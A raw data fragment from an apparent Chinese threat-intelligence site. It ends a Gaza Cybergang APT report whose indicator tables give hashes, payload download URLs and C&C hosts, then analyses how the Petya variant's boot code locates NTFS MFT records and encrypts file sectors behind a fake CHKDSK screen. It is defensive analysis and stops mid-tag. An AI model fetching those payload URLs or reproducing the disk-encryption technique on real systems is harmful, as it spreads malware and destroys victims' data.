المركزية.doc</td>\n</tr>\n<tr>\n<td>Ps.exe</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>MD5</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>87a67371770fda4c2650564cbb00934d</td>\n</tr>\n<tr>\n<td>004ef1209458bf6056147d1ce001fe9d</td>\n</tr>\n<tr>\n<td>2b3df594e5d73a95c9f2d820072b067a</td>\n</tr>\n<tr>\n<td>bfefedb094f40c276bf1ae26b225e310</td>\n</tr>\n<tr>\n<td>4f3b1a2088e473c7d2373849deb4536f</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>下载链接</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>https://doc-0k-2g-docs.googleusercontent.com/docs/securesc/ha0ro937gcuc7l7deffksulhg5h7mbp1/jft1kksjnhmtb1r0jdudcme1r83f05an/1497996000000/00086189316172082427/*/0B1NUTMCAOKBTdVQzTXlUNHBmZUU?e=download</td>\n</tr>\n<tr>\n<td>https://drive.google.com/uc?export=download&amp;id=0B1NUTMCAOKBTdVQzTXlUNHBmZUU</td>\n</tr>\n<tr>\n<td>http://138.68.242.68:820/word.hta</td>\n</tr>\n<tr>\n<td>http://138.68.242.68:808/word.hta</td>\n</tr>\n<tr>\n<td>https://gist.githubusercontent.com/0lol0/142364f6926d01c9b050cbeae12cbf59/raw/89e00b0bbd830e7779301f642543be9b0bcddeb3/1.ps1</td>\n</tr>\n<tr>\n<td>http://lol.mynetav.org:3737/ptj</td>\n</tr>\n</tbody>\n</table>\n<table>\n<thead>\n<tr>\n<th><strong>C&amp;C</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>lol.mynetav.org</td>\n</tr>\n<tr>\n<td>138.68.242.68</td>\n</tr>\n</tbody>\n</table>\n',category:"专题报告",__v:1,abstract:"2017年6月下旬， 360威胁情报中心发现了Gaza Cybergang APT事件的新样本，其特点是恶意代码完全使用网上流行的标准攻击框架Cobalt Strike生成，配合CVE-2017-0199漏洞通过鱼叉邮件投递，本文档对并对此次攻击事件的攻击链条进行梳理，并对使用的木马相关技术进行分析。",modify_time:"2017-08-07T07:13:04.377Z",readableId:"gaza-cybergang-apt-sample",publish_time:"2017-07-27T17:58:36.000Z",descImg:"/uploads/2017/07/31/8102c0ab69bdb893c5c5a0dde724ee80.png",insert_time:"2017-07-25T12:03:51.279Z",isDraft:!1,tags:["APT","gaza"]},{_id:"597733a71c670a09e493ee40",title:"Petya变种勒索蠕虫启动代码分析",author:"admin",content:'<h1 class="line" data-line="0">背景</h1>\n<p class="line" data-line="2">继5月的WannaCry勒索蠕虫事件以后，2017年6月又出现了Petya变种勒索蠕虫，除了利用永恒之蓝漏洞和加密勒索以后，Petya变种与WannaCry有比较大的差别。WannaCry会加密机器上的文件，导致数据损毁，而Petya更为激进，它会加密系统的MBR直接导致机器无法启动，本文对其执行的MBR及文件系统的加密机制做详细的分析。</p>\n<h1 class="line" data-line="4">恶意代码分析</h1>\n<p class="line" data-line="6">由于执行恶意操作的指令并不是以文件形式存在，我们使用WinHex工具提取受攻击机器的磁盘前23个扇区的数据进行分析，对应代码数据的Hash为 841e12729f200a5620859f2958e2d484。</p>\n<h2 class="line" data-line="8">相关数据结构</h2>\n<p class="line" data-line="10">计算机启动时执行完BIOS的启动代码，检查各硬件设备正常后，JMP到MBR的引导代码进行执行；然后由MBR引导至活动分区的DBR，再由DBR引导操作系统。如：DBR调用NTLDR，再由NTLDR调用系统内核。</p>\n<p class="line" data-line="12">Petya病毒修改了系统的MBR，病毒在Bios加载后获得执行机会，病毒将加载存储在0x1扇区后的大小为0x20大小的病毒代码加载执行，这些代码会还原出真实的MBR，通过对还原出来的MBR解析，得到系统的DBR，通过DBR解析到系统的MFT结构，遍历所有的MFT，根据MFT找到文件内容所在的扇区后，读取该扇区加密内容后再写回到扇区中，从而实现对文件的加密。要完整的了解整个的加密过程，首先就是熟悉系统的MBR、DBR、MFT等结构的含义与功能。</p>\n<h3 class="line" data-line="14">MBR</h3>\n<p class="line" data-line="16">Petya病毒修改了系统的MBR，病毒在Bios加载后获得执行机会，病毒将加载存储在0x1扇区后的大小为0x20大小的病毒代码加载执行，这些代码会还原出真实的MBR。在加密文件的过程中，Petya病毒会使用到MBR中</p>\n<p class="line" data-line="18">MBR扇区由以下四部分组成：</p>\n<ul>\n<li>引导代码：引导代码占MBR分区的前440字节，负责整个系统启动。如果引导代码被破坏，系统将无法启动。</li>\n<li>Windows磁盘签名：占引导代码后面的4字节，是Windows初始化磁盘写入的磁盘标签，如果此标签被破坏，则系统会提示“初始化磁盘”。</li>\n<li>MBR分区表：占Windows磁盘标签后面的64个字节，是整个硬盘的分区表。</li>\n<li>MBR结束标志：占MBR扇区最后2个字节，一直为“55 AA”。</li>\n</ul>\n<p class="line" data-line="25">MBR结构如下：</p>\n<pre class="hljs"><code class="hljs">;====================================================================\n    主引导记录(MBR)结构\n;====================================================================\n typedef struct _MASTER_BOOT_RECORD\n {\n  UCHAR    BootCode[446];\n  PARTITION_ENTRY  Partition[4];\n  USHORT    Signature;\n }MASTER_BOOT_RECORD,*PMASTER_BOOT_RECORD;\n \n;====================================================================\n;====================================================================\n     分区表项结构(16字节)\n;====================================================================\n \n typedef struct _PARTITION_ENTRY\n {\n  UCHAR BootIndicator;  // 能否启动标志\n  UCHAR StartHead;   // 该分区起始磁头号\n  UCHAR StartSector;  // 起始柱面号高2位：6位起始扇区号\n  UCHAR StartCylinder;  // 起始柱面号低8位\n  UCHAR PartitionType;  // 分区类型\n  UCHAR EndHead;   // 该分区终止磁头号\n  UCHAR EndSector;   // 终止柱面号高2位：6位终止扇区号\n  UCHAR EndCylinder;  // 终止柱面号低8位\n  ULONG StartLBA;   // 起始扇区号\n  ULONG TotalSector;  // 分区尺寸（总扇区数）\n }PARTITION_ENTRY,*PPARTITION_ENTRY;\n</code></pre>\n<p class="line" data-line="58">对于其中的PartitionType 字段，Windows下可识别的分区类型主要有：</p>\n<ul>\n<li>0x07 表示普通分区(Windows分区、数据分区。默认分区类型)。</li>\n<li>0xEE 表示该分区表是PMBR，紧随其后的应该是GPT分区表头和GPT分区表，因此这是一块GPT硬盘。</li>\n<li>0xEF 表示EFI系统分区</li>\n</ul>\n<p class="line" data-line="64">Petya在解密出原始的MBR后，解析MBR结构，得到起始扇区号，并根据起始扇区定位到DBR。</p>\n<p class="line" data-line="66">病毒解析MBR时，会对分区类型做判断，如果PMBR和EFI类型的系统分区，默认会不做处理。</p>\n<p class="line" data-line="68">在010edit工具中查看</p>\n<p class="text-center line" data-line="70"><img src="/uploads/2017/07/25/cb8ab7085ca7da88a58ab5c86cc1e39c.png" alt="" width="90%"></p>\n<p class="line" data-line="72">判断分区类型，取了这两个字段：开始扇区与扇区大小：</p>\n<p class="text-center line" data-line="74"><img src="/uploads/2017/07/25/5bb7e2b71f9cd2a909737c77f19e5e48.png" alt="" width="90%"></p>\n<p class="line" data-line="76">在启动扇区（也就是63扇区）处，读一个扇区的内容，就是DBR结构</p>\n<p class="line" data-line="78">从MBR中可以定位到MBR分区表,根据分区表的属性就可以得到活动分区的扇区地址，也就得到了DBR结构地址。</p>\n<h3 class="line" data-line="80">DBR</h3>\n<p class="line" data-line="82">DBR中存放着关于文件系统的重要参数信息以及系统引导代码。病毒解析到DBR后，只是为了取的DBR结构中的MftStartLcn字段(这个字段表明了MFT结构所在的扇区地址)，以便能进一步定位文件系统。</p>\n<p class="line" data-line="84">DBR的结构如下：</p>\n<pre class="hljs"><code class="hljs"> ////////////////////////////////////////////////////////////////////////////  \n //  \n //  NTFS 的DBR 数据结构  \n //  \n ////////////////////////////////////////////////////////////////////////////  \n __typedef__ __struct__ _BIOS_PARAMETER_BLOCK {  \n   \n  /*+0x0B*/    uint16  BytesPerSector;    // 字节/扇区一般为0x0200 即512  \n  /*+0x0D*/    uchar   SectorsPerCluster; // 扇区/簇   \n  /*+0x0E*/    uint16  ReservedSectors;   // 保留扇区  \n  /*+0x0F*/    uchar   Fats;              //   \n  /*+0x11*/    uint16  RootEntries;       //   \n  /*+0x13*/    uint16  Sectors;           //   \n  /*+0x15*/    uchar   Media;             // 媒介描述  \n  /*+0x16*/    uint16  SectorsPerFat;     //   \n  /*+0x18*/    uint16  SectorsPerTrack;   // 扇区/磁轨  \n  /*+0x1A*/    uint16  Heads;             // 头  \n  /*+0x1C*/    uint32  HiddenSectors;     // 隐藏扇区  \n  /*+0x20*/    uint32  LargeSectors;      // checked when volume is mounted  \n   \n }BIOS_PARAMETER_BLOCK, *pBIOS_PARAMETER_BLOCK;  \n\n__typedef__ __struct__ _NTFS_Boot_Sector{  \n\n  /*+0x00*/  uchar    JmpCode[3];        // 跳转指令  \n  /*+0x03*/  __char__     OemID[8];          // 文件系统ID  \n  /*+0x0B*/  BIOS_PARAMETER_BLOCK PackedBpb;   // BPB  \n  /*+0x24*/  uchar    Unused[4];           // 未使用,总是为  \n  /*+0x28*/  uint64   NumberSectors;       // 扇区总数  \n  /*+0x30*/  lcn      MftStartLcn;        // 开始C# $MFT  (簇) 乘以 BIOS_PARAMETER_BLOCK.SectorsPerCluster 值得到扇区号  \n  /*+0x38*/  lcn      Mft2StartLcn;       // 开始C# $MFTMirr (簇)  \n  /*+0x40*/  uchar    ClustersPerFileRecordSegment;  // 文件记录大小指示器  \n  /*+0x41*/  uchar   Reserved0[3];       // 未使用  \n  /*+0x44*/  uchar DefaultClustersPerIndexAllocationBuffer;     // 簇/索引块  \n  /*+0x45*/  uchar   Reserved1[3];       // 未使用  \n  /*+0x48*/  uint64  SerialNumber;       // 64位序列号  \n  /*+0x50*/  uint32  Checksum;           // 校验和  \n  /*+0x54*/  uchar   BootStrap[426];     // 启动代码  \n  /*+0x1FE*/ uint16  RecordEndSign;      // 0xAA55 结束标记  \n }NTFS_Boot_Sector, *pNTFS_Boot_Sector;  \n</code></pre>\n<p class="line" data-line="129">其中，定位MFT时，最重要的结构为MftStartLcn表示起始簇号，乘以BIOS_PARAMETER_BLOCK.SectorsPerCluster（在我的机器上这个值为8，表示一个簇由8个扇区组成）后就得到起始扇区号。</p>\n<h3 class="line" data-line="131">MFT</h3>\n<h4 class="line" data-line="133">简介</h4>\n<p class="line" data-line="135">MFT，即主文件表（Master File Table）的简称，它是NTFS文件系统的核心。MFT由一个个MFT项（也称为文件记录）组成。每个MFT项的前部为0x10字节的头结构，用来描述本MFT项的相关信息。后面节存放着属性。每个文件和目录的信息都包含在MFT中，每个文件和目录至少有一个MFT项。除了引导扇区外，访问其他任何一个文件前都需要先访问MFT，在MFT中找到该文件的MFT项，根据MFT项中记录的信息找到文件内容并对其进行访问。</p>\n<p class="line" data-line="137">MFT结构分为两种：元文件与普通文件。</p>\n<p class="line" data-line="139">元文件对于用户是不能直接访问的，MFT将开头的16个文件记录块保留用于这些元数据文件，除此之外的文件记录块才用于普通的用户文件和目录。</p>\n<pre class="hljs"><code class="hljs">#### 16个元文件\n#define\tMFT_IDX_MFT\t\t\t\t0\n#define\tMFT_IDX_MFT_MIRR\t\t1\n#define\tMFT_IDX_LOG_FILE\t\t2\n#define\tMFT_IDX_VOLUME\t\t\t3\n#define\tMFT_IDX_ATTR_DEF\t\t4\n#define\tMFT_IDX_ROOT\t\t\t5\n#define\tMFT_IDX_BITMAP\t\t\t6\n#define\tMFT_IDX_BOOT\t\t\t7\n#define\tMFT_IDX_BAD_CLUSTER\t\t8\n#define\tMFT_IDX_SECURE\t\t\t9\n#define\tMFT_IDX_UPCASE\t\t\t10\n#define\tMFT_IDX_EXTEND\t\t\t11\n#define\tMFT_IDX_RESERVED12\t\t12\n#define\tMFT_IDX_RESERVED13\t\t13\n#define\tMFT_IDX_RESERVED14\t\t14\n#define\tMFT_IDX_RESERVED15\t\t15\n#define\tMFT_IDX_USER\t\t\t16\n</code></pre>\n<p class="line" data-line="162">这16个原文件本身也是MFT结构的模式，可以理解为记录了MFT信息的MFT结构。</p>\n<ul>\n<li>\n<p>怎么解析这16个原文件的MFT结构呢？</p>\n<ul>\n<li>换句话说，通过MBR定位到DBR,通过DBR定位到MFT，此时的MFT就对应着索引为MFT_IDX_MFT的MFT，向后偏移文件记录大小的地方，就存放着索引为MFT_IDX_MFT_MIRR的MFT。再向后偏移文件记录大小的地方，就存放着索引为MFT_IDX_LOG_FILE的MFT</li>\n</ul>\n</li>\n<li>\n<p>解析这16个原文件的MFT结构有什么用？</p>\n<ul>\n<li>如对于MFT_IDX_VOLUME 这个MFT结构，解析这个MFT结构中的ATTR_TYPE_VOLUME_INFORMATION（对应着0x70）就可以得到NTFS卷的版本信息,解析这个MFT结构中的ATTR_TYPE_VOLUME_NAME属性（对应着0x60）就可以得到NTFS卷名信息。</li>\n</ul>\n</li>\n</ul>\n<p class="line" data-line="170">再如，对于MFT_IDX_MFT 这个MFT结构，解析这个MFT结构中的ATTR_TYPE_DATA（对应0x80）的属性RealSize，就表示整个卷所有的文件记录的大小信息。利用这个大小信息是以字节表示的，用这个大小信息除以每个文件记录所占用的字节就得到了卷占有的文件记录数量。计算出来的文件记录数量是将元文件也计算在内的。</p>\n<p class="line" data-line="172">依次遍历每个文件记录数量，读取这个文件记录的内容就是MFT结构，解析这个MFT的对应属性就可以解析出文件名、文件属性、文件内容等。</p>\n<h4 class="line" data-line="174">普通MFT</h4>\n<p class="line" data-line="176">遍历文件时，从第16个文件记录开始向后遍历，才会得到普通的用户文件和目录信息及内容。</p>\n<h4 class="line" data-line="178">数据结构</h4>\n<p class="line" data-line="180">MFT的直观结构如下，</p>\n<pre class="hljs"><code class="hljs">// 文件记录体\n// 属性1\n// 属性2\n// …………\n</code></pre>\n<p class="text-center line" data-line="189"><img src="/uploads/2017/07/25/305f756feed25724d4e439b3ab6bd804.png" alt="" width="75%"></p>\n<p class="line" data-line="191">每个MFT的结构如下：</p>\n<pre class="hljs"><code class="hljs">// 文件记录头  \ntypedef struct _FILE_RECORD_HEADER  \n{  \n /*+0x00*/  uint32 Type;            // 固定值\'FILE\'  \n /*+0x04*/  uint16 UsaOffset;       // 更新序列号偏移, 与操作系统有关  \n /*+0x06*/  uint16 UsaCount;        // 固定列表大小Size in words of Update Sequence Number & Array (S)  \n /*+0x08*/  uint64 Lsn;             // 日志文件序列号(LSN)  \n} FILE_RECORD_HEADER, *PFILE_RECORD_HEADER;  \n  \n// 文件记录体  \ntypedef struct _FILE_RECORD{  \n /*+0x00*/  FILE_RECORD_HEADER Ntfs;  // MFT表头  \n /*+0x10*/  uint16  SequenceNumber;   // 序列号(用于记录文件被反复使用的次数)  \n /*+0x12*/  uint16  LinkCount;        // 硬连接数  \n /*+0x14*/  uint16  AttributeOffset;  // 第一个属性偏移  \n /*+0x16*/  uint16  Flags;            // falgs, 00表示删除文件,01表示正常文件,02表示删除目录,03表示正常目录  \n /*+0x18*/  uint32  BytesInUse;       // 文件记录实时大小(字节) 当前MFT表项长度,到FFFFFF的长度+4  \n /*+0x1C*/  uint32  BytesAllocated;   // 文件记录分配大小(字节)  \n /*+0x20*/  uint64  BaseFileRecord;   // = 0 基础文件记录 File reference to the base FILE record  \n /*+0x28*/  uint16  NextAttributeNumber; // 下一个自由ID号  \n /*+0x2A*/  uint16  Pading;           // 边界  \n /*+0x2C*/  uint32  MFTRecordNumber;  // windows xp中使用,本MFT记录号  \n /*+0x30*/  uint32  MFTUseFlags;      // MFT的使用标记  \n}FILE_RECORD, *pFILE_RECORD;  \n</code></pre>\n<p class="line" data-line="220">根据FILE头部数据找到下面的一个个属性,接下来分析的就是一个个属性了，属性由属性头跟属性体组成,属性头的结构定义如下：</p>\n<pre class="hljs"><code class="hljs">// 属性头  \ntypedef struct  \n{  \n /*+0x00*/  ATTRIBUTE_TYPE AttributeType;    // 属性类型  \n /*+0x04*/  uint16 RecordLength;             // 总长度(Header+body长度)  \n /**0x06*/  uint16 unknow0;  \n /*+0x08*/  uchar Nonresident;               // 非常驻标志  \n /*+0x09*/  uchar NameLength;                // 操作属性名长度  \n  \n                                          // 0X0001为压缩标记  \n                                        // 0X4000为加密标记  \n                                        // 0X8000为系数文件标志  \n /*+0x0A*/  uint16 NameOffset;           // 属性名偏移(从属性起始位置的偏移)  \n                                              // NameLength 如果不为零,则用这个值去寻址数据偏移  \n /*+0x0C*/  uint16 Flags;                    // ATTRIBUTE_xxx flags.  \n /*+0x0E*/  uint16 AttributeNumber;          // The file-record-unique attribute instance number for this attribute.  \n} ATTRIBUTE, *PATTRIBUTE;  \n  \n// 属性头   \ntypedef struct _RESIDENT_ATTRIBUTE  \n{  \n /*+0x00*/  ATTRIBUTE Attribute;   // 属性  \n /*+0x10*/  uint32 ValueLength;    // Data部分长度  \n /*+0x14*/  uint16 ValueOffset;    // Data内容起始偏移  \n /*+0x16*/  uchar Flags;           // 索引标志  \n /*+0x17*/  uchar Padding0;        // 填充  \n} RESIDENT_ATTRIBUTE, *PRESIDENT_ATTRIBUTE;  \n</code></pre>\n<p class="line" data-line="252">Petya中涉及到MFT的属性</p>\n<pre class="hljs"><code class="hljs">// 属性类型定义 \nAttributeFileName = 0x30,  \nAttributeData = 0x80, \n</code></pre>\n<p class="line" data-line="259">这两个属性的定义如下：</p>\n<pre class="hljs"><code class="hljs">// 文件属性ATTRIBUTE\\.AttributeType == 0x30  \ntypedef struct  \n{  \n /*+0x00*/  uint64 DirectoryFile:48;    // 父目录记录号(前个字节)  \n /*+0x06*/  uint64 ReferenceNumber:16;  // +序列号(与目录相关)  \n /*+0x08*/  uint64 CreationTime;        // 文件创建时间  \n /*+0x10*/  uint64 ChangeTime;          // 文件修改时间          \n /*+0x18*/  uint64 LastWriteTime;       // MFT更新的时间  \n /*+0x20*/  uint64 LastAccessTime;      // 最后一次访问时间  \n /*+0x28*/  uint64 AllocatedSize;       // 文件分配大小  \n /*+0x30*/  uint64 DataSize;            // 文件实际大小  \n /*+0x38*/  uint32 FileAttributes;      // 标志,如目录压缩隐藏等  \n /*+0x3C*/  uint32 AlignmentOrReserved; // 用于EAS和重解析  \n /*+0x40*/  uchar NameLength;      // 以字符计的文件名长度,没字节占用字节数由下一字节命名空间确定  \n  \n            // 文件名命名空间, 0 POSIX大小写敏感,1 win32空间,2 DOS空间, 3 win32&DOS空间  \n /*+0x41*/  uchar NameType;          \n /*+0x42*/  wchar Name[1];         // 以Unicode方式标识的文件名  \n} FILENAME_ATTRIBUTE, *PFILENAME_ATTRIBUTE;  \n  \n// 数据流属性 ATTRIBUTE.AttributeType == 0x80   \ntypedef struct _NONRESIDENT_ATTRIBUTE  \n{  \n    /*+0x00*/   ATTRIBUTE Attribute;    \n  \n    /*+0x10*/   uint64 StartVcn;     // LowVcn 起始VCN  起始簇号  \n    /*+0x18*/   uint64 LastVcn;      // HighVcn  结束VCN  结束簇号  \n  \n    /*+0x20*/   uint16 RunArrayOffset;    // 数据运行的偏移，非常重要 \n    /*+0x22*/   uint16 CompressionUnit;   // 压缩引擎  \n    /*+0x24*/   uint32  Padding0;       // 填充  \n    /*+0x28*/   uint32  IndexedFlag;    // 为属性值分配大小(按分配的簇的字节数计算)  \n    /*+0x30*/   uint64 AllocatedSize;   // 属性值实际大小  \n    /*+0x38*/   uint64 DataSize;     // 属性值压缩大小  \n    /*+0x40*/   uint64 InitializedSize;   // 实际数据大小  \n    /*+0x48*/   uint64 CompressedSize;    // 压缩后大小  \n} NONRESIDENT_ATTRIBUTE, *PNONRESIDENT_ATTRIBUTE;  \n</code></pre>\n<ul>\n<li>对于0x30属性：</li>\n</ul>\n<p class="line" data-line="303">对于MFT中的0x30属性的直观认识，如下：</p>\n<p class="line" data-line="305">黄色部分对应着上表中的ATTRIBUTE结构，红色部分对应着上表中的NONRESIDENT_ATTRIBUTE结构。选中部分对应着FILENAME_ATTRIBUTE结构内容，这里面包含了文件的各种时间属性和文件名等内容。</p>\n<p class="text-center line" data-line="307"><img src="/uploads/2017/07/25/83f1f40efdf04df7bb760b0299c90b61.png" alt="" width="90%"></p>\n<p class="line" data-line="309">Petya病毒在遍历MFT时，会通过判断当前MFT的AttributeFileName属性判断是否加密该MFT。</p>\n<ul>\n<li>对于0x80属性：</li>\n</ul>\n<p class="line" data-line="313">对于MFT中的0x80属性的直观认识，如下：</p>\n<p class="line" data-line="315">黄色部分对应着上表中的ATTRIBUTE结构，红色部分对应着上表中的NONRESIDENT_ATTRIBUTE结构。绿色部分对应着RUN-LIST结构内容。</p>\n<p class="text-center line" data-line="317"><img src="/uploads/2017/07/25/0aa26858b723e9404715e63d982d3cf3.png" alt="" width="90%"></p>\n<p class="line" data-line="319">80H属性是文件数据属性，该属性容纳着文件的内容，文件的大小一般指的就是未命名数据流的大小。该属性没有最大最小限制，最小情况是该属性为常驻属性。常驻属性就不做多的解释了，如下是一个非常驻的80H属性。</p>\n<p class="line" data-line="321">该属性的“Run List”值为“32 0C 1B 00 00 0C”，其具体含义如下：</p>\n<p class="text-center line" data-line="323"><img src="/uploads/2017/07/25/11ec3809e86bab9c742003855fe4a065.png" alt="" width="90%"> </p>\n<p class="line" data-line="325">Petya病毒在加密文件内容时，会通过Run List定位到文件内容所在的真正扇区加密文件，如果文件内容大于2个扇区，则只加密前两个扇区。</p>\n<h2 class="line" data-line="327">恶意代码加载过程</h2>\n<h3 class="line" data-line="329">1 加载代码到0x8000执行</h3>\n<p class="line" data-line="331">从第一个扇区开始，读取0x20个扇区到0x8000地址处，随后跳到0x8000处执行</p>\n<p class="line" data-line="333">循环读取0x20个扇区代码片段：</p>\n<p class="text-center line" data-line="335"><img src="/uploads/2017/07/25/f1ddca4af289916c2eaa3b5fd527c52e.png" alt="" width="90%"> </p>\n<p class="line" data-line="337">在循环里使用int 13读取磁盘内容</p>\n<p class="text-center line" data-line="339"><img src="/uploads/2017/07/25/d517cab4208845fae0a933191f17768a.png" alt=""> </p>\n<h3 class="line" data-line="341">2 调用函数读取硬盘参数</h3>\n<p class="line" data-line="343">读取硬盘参数</p>\n<p class="text-center line" data-line="345"><img src="/uploads/2017/07/25/bc1e54d9ac8e7f62081cce176f621822.png" alt="" width="90%"> </p>\n<p class="line" data-line="347">比较“FA 31 C0 8E”硬编码，判断当前的第一个扇区的内容是不是病毒写入的内容。</p>\n<p class="text-center line" data-line="349"><img src="/uploads/2017/07/25/f989c9b49aca1fbef95fb2ed13ac55ca.png" alt="" width="90%"> </p>\n<h3 class="line" data-line="351">判断加密标志</h3>\n<p class="line" data-line="353">读取0x20扇区的内容（该扇区保存了病毒的配置信息），判断该扇区的第一个字节是不是1，如果是1，表示mbr已经被加过密，就来到显示勒索界面的流程;如果不为1，表示还未对MBR和MFT进行加密，进入加密流程。</p>\n<p class="text-center line" data-line="355"><img src="/uploads/2017/07/25/51d51b4c39e024fbb002d0a762828a41.png" alt="" width="99%"> </p>\n<h2 class="line" data-line="357">加密过程</h2>\n<h3 class="line" data-line="359">1 打印修复磁盘信息，设置加密标志</h3>\n<p class="line" data-line="361">打印出虚假的“Repairing file system on C:”信息，读取0x20扇区中的配置信息到内存，并将读取到的配置信息的加密标志设置为1。随后，将修改过加密标志的内容写入到扇区中，为了保证写入成功，这里循环写了0x20次。</p>\n<p class="line" data-line="363">打印的磁盘修复信息如下：</p>\n<p class="text-center line" data-line="365"><img src="/uploads/2017/07/25/fec6399d07d526a8fb688c8e4f54e1de.png" alt="" width="90%"> </p>\n<p class="text-center line" data-line="367"><img src="/uploads/2017/07/25/d514c1f5da08dc7fa6f656986c5a6564.png" alt="" width="90%"> </p>\n<h3 class="line" data-line="369">2 加密验证扇区</h3>\n<p class="line" data-line="371">加密验证扇区的方法为：读取0x21扇区的内容（这个扇区保存的全是0x07数据），使用从配置信息扇区读取的key与n做为加密参数，调用salsa加密该读到的0x07内容，并将加密后的内容写入到0x21扇区中</p>\n<p class="text-center line" data-line="373"><img src="/uploads/2017/07/25/5c0b22a8b5c23f1824f9da08267a83e0.png" alt="" width="90%"> </p>\n<p class="text-center line" data-line="375"><img src="/uploads/2017/07/25/099a8b6797c6401eabdb1efdd1b67b50.png" alt="" width="90%"> </p>\n<p class="line" data-line="377">显示虚假的“CHKDSK is repairing sector”界面，实际在后台正在加密MFT数据。</p>\n<p class="text-center line" data-line="379"><img src="/uploads/2017/07/25/9c27e3f0dcce5beaa74b5f250f5ca44d.png" alt="" width="90%"> </p>\n<h3 class="line" data-line="381">3 加密操作</h3>\n<h4 class="line" data-line="383">文件遍历的原理</h4>\n<p class="line" data-line="385">Petya病毒通过解析MBR，DBR得到MFT地址。解析MFT索引为0的元文件，得到属性为DATA的属性内容，取出属性中的RUN-LIST结构中的簇数量与起始扇区，根据这两个字段遍历所有的MFT就得到了当前文件系统中所有的文件信息。</p>\n<ol>\n<li>解析MBR</li>\n</ol>\n<p class="line" data-line="389">解析原始MBR数据的代码片段：</p>\n<p class="text-center line" data-line="391"><img src="/uploads/2017/07/25/c492c18191fb7333811c8d541a91f200.png" alt="" width="90%"> </p>\n<p class="line" data-line="393">判断MBR中的分区类型：</p>\n<p class="text-center line" data-line="395"><img src="/uploads/2017/07/25/84c682ad0195067b28cdd0b6f7f9a7f0.png" alt="" width="90%"> </p>\n<p class="line" data-line="397">判断从mbr中读取到的StartLBA字段不为空</p>\n<p class="text-center line" data-line="399"><img src="/uploads/2017/07/25/7d4060cd86c75d892c4f283b6f10ad1c.png" alt="" width="90%"> </p>\n<p class="line" data-line="401">从mbr中解析到StartLBA字段，并读取该字段对应的扇区，此扇区的内容就为DBR相关的内容：</p>\n<p class="text-center line" data-line="403"><img src="/uploads/2017/07/25/b423cd8965358de2784a89331806ba14.png" alt="" width="90%"> </p>\n<p class="line" data-line="405">读取到DBR后，解析出MftStartLcn字段，该字段就表示 MFT地址：</p>\n<p class="text-center line" data-line="407"><img src="/uploads/2017/07/25/9b006a175eec0a34093758e0ae23b111.png" alt="" width="90%"> </p>\n<p class="line" data-line="410">得到MFT地址后，该地址就是索引为0的MFT元文件地址,从该元文件结构中取出属性为0x80（DATA）的内容，</p>\n<p class="line" data-line="412">首先读取到$MFT的扇区内容：</p>\n<p class="text-center line" data-line="414"><img src="/uploads/2017/07/25/df5a5ee6c0ac0eba3a364436009c9a8a.png" alt="" width="90%"> </p>\n<p class="line" data-line="416">解析属性，判断是不是0x80(DATA)属性类型</p>\n<p class="text-center line" data-line="418"><img src="/uploads/2017/07/25/d8d49240c8840d7173ba6395017b4cef.png" alt="" width="90%"> </p>\n<p class="line" data-line="420">对$MFT属性0x80中的解析，得到下面信息：</p>\n<p class="line" data-line="422">run_data_cluster*sector/cluster + 0x20(0x20为元文件占用的扇区大小)+mbr. arg_StartLBA，作为普通 MFT扇区的起始扇区，这样是保证加密的过程中不会加密元文件扇区与mbr相关的扇区。</p>\n<p class="line" data-line="424">（run_data_num_clusters * sector/cluster）- 0x20(0x20为元文件占用的扇区大小)，做为普通MFT的扇区大小</p>\n<p class="text-center line" data-line="426"><img src="/uploads/2017/07/25/c8a6dc7b98daaf4b564a84671e995644.png" alt="" width="90%"> </p>\n<p class="line" data-line="428">随后，就来到遍历用户MFT的函数：</p>\n<p class="text-center line" data-line="430"><img src="/uploads/2017/07/25/a8b85a6edc3806c80fab3c03f24cde45.png" alt="" width="90%"> </p>\n<h4 class="line" data-line="433">遍历普通MFT结构</h4>\n<p class="line" data-line="435">遍历普通MFT结构的函数在00008FA6处，该函数为病毒代码中最为主要的函数。</p>\n<p class="line" data-line="437">下面对这个函数进行详细分析:</p>\n<p class="line" data-line="439">在调试的过程中，parse_User_MFT函数的参数内容为：80 C6 5F 00 60 00 20 C6  00 00 3F 00 00 00 3F 00 60 00 08 C6 2C 67 4A 67  8B 77 52 9C 01,结合调试时传递的参数内容，对函数作出说明。</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th>类型</th>\n<th>数据</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>dir_num</td>\n<td>WORD</td>\n<td>80 C6</td>\n<td>只取了第一字节80使用，在通过int 13读写扇区内容使用到</td>\n</tr>\n<tr>\n<td>abase_sector</td>\n<td>DWORD</td>\n<td>5F 00 60 00</td>\n<td>普通MFT的起始扇区</td>\n</tr>\n<tr>\n<td>TotalSetorNum</td>\n<td>WORD</td>\n<td>20 C6</td>\n<td>普通MFT扇区数量</td>\n</tr>\n<tr>\n<td>show_char</td>\n<td>WORD</td>\n<td>00 00</td>\n<td>用于屏幕显示</td>\n</tr>\n<tr>\n<td>StartLBA</td>\n<td>DWORD</td>\n<td>3F 00 00 00</td>\n<td>从mbr中解析出的startLBA字段，在加密过程中，如果MFT的数据内容在startLBA扇区内，就跳过到此扇区的加密，防止误把mbr重要数据加密</td>\n</tr>\n<tr>\n<td>arg_E</td>\n<td></td>\n<td>3F 00 60 00</td>\n<td>没使用</td>\n</tr>\n<tr>\n<td>SectorsPerCluster</td>\n<td>WORD</td>\n<td>08 C6</td>\n<td>只取了第一字节08使用，从dbr中解析出来的SectorsPerCluster字段，表示每簇的扇区数量</td>\n</tr>\n<tr>\n<td>p_encrypt_num</td>\n<td>WORD</td>\n<td>2C 67</td>\n<td>用来存放当前已经加密的扇区数量的缓冲区</td>\n</tr>\n<tr>\n<td>salsa_key</td>\n<td>WORD</td>\n<td>4A 67</td>\n<td>salsa算法使用的KEY</td>\n</tr>\n<tr>\n<td>arg_iv</td>\n<td>WORD</td>\n<td>8B 77</td>\n<td>salsa算法使用的 IV</td>\n</tr>\n<tr>\n<td>CharShow</td>\n<td>WORD</td>\n<td>52 9C</td>\n<td>用于显示界面字符</td>\n</tr>\n<tr>\n<td>arg_flag</td>\n<td>WORD</td>\n<td>01 00</td>\n<td>标志位，只是标志位为1时，才会加密</td>\n</tr>\n</tbody>\n</table>\n<p 